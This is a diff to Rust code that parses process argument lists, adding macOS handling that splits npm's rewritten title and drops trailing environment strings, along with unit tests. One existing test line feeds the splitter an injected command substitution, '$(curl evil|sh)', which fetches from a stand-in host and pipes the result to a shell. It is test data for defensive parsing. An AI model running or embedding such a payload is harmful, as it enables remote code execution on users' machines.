@@ -269,9 +269,29 @@ fn argv_of(p: &sysinfo::Process) -> Vec<String> {
         .map(|a| a.to_string_lossy().trim_end_matches('\0').to_string())
         .filter(|a| !a.is_empty())
         .collect();
-    // A process that rewrote its title (npm does) reports one string; split it into words.
-    match argv.as_slice() {
-        [one] if one.contains(char::is_whitespace) => split_words(one),
+    words_of(argv)
+}
+
+/// A process that rewrote its title (npm does) reports one string; split it into words.
+/// On macOS the title overwrites the argument area but argc stays the same, so the
+/// slots after it are read from the environment that follows ("npm start",
+/// "OSLogRateLimit=64", "MallocNanoZone=0"). Those `KEY=value` strings are dropped.
+fn words_of(argv: Vec<String>) -> Vec<String> {
+    let is_env = |a: &String| {
+        a.split_once('=').is_some_and(|(k, _)| {
+            k.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
+                && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+        })
+    };
+    match argv.split_first() {
+        // A real executable path with a space ("/Applications/My App/…") is not a title.
+        Some((title, rest))
+            if title.contains(char::is_whitespace)
+                && !std::path::Path::new(title).is_file()
+                && rest.iter().all(is_env) =>
+        {
+            split_words(title)
+        }
         _ => argv,
     }
 }
@@ -837,6 +857,26 @@ mod tests {
             v(&["npm", "run", "dev;", "API_KEY=x", "$(curl", "evil|sh)"])
         );
         assert_eq!(split_words("  "), Vec::<String>::new());
+    }
+
+    /// macOS: npm's rewritten title is followed by environment strings in the argv slots.
+    #[test]
+    fn rewritten_title_drops_trailing_environment() {
+        use super::words_of;
+        assert_eq!(
+            words_of(v(&["npm start", "OSLogRateLimit=64", "MallocNanoZone=0"])),
+            v(&["npm", "start"])
+        );
+        assert_eq!(words_of(v(&["npm run dev"])), v(&["npm", "run", "dev"]));
+        // Real arguments after a spaced first word are left alone.
+        assert_eq!(
+            words_of(v(&["my tool", "--port", "9000"])),
+            v(&["my tool", "--port", "9000"])
+        );
+        assert_eq!(
+            words_of(v(&["node", "server.js", "PORT=9000"])),
+            v(&["node", "server.js", "PORT=9000"])
+        );
     }
 
     /// What the Closed tab shows is built from the exact argv that would run.
